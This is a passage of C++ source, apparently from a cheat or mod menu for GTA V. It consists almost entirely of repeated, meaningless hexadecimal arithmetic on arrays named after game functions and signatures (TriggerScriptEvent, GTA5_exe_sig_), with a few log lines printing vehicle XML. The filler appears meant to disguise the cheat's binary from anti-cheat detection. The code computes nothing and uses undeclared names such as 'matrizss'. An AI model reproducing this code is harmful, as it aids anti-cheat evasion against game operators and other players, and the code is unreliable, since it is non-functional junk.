				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<tyreSmoke_G>255</tyreSmoke_G>");
			Extern_Reader::LOG::LogSemHora("<tyreSmoke_B>255</tyreSmoke_B>");
			Extern_Reader::LOG::LogSemHora("<LrInterior>0</LrInterior>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
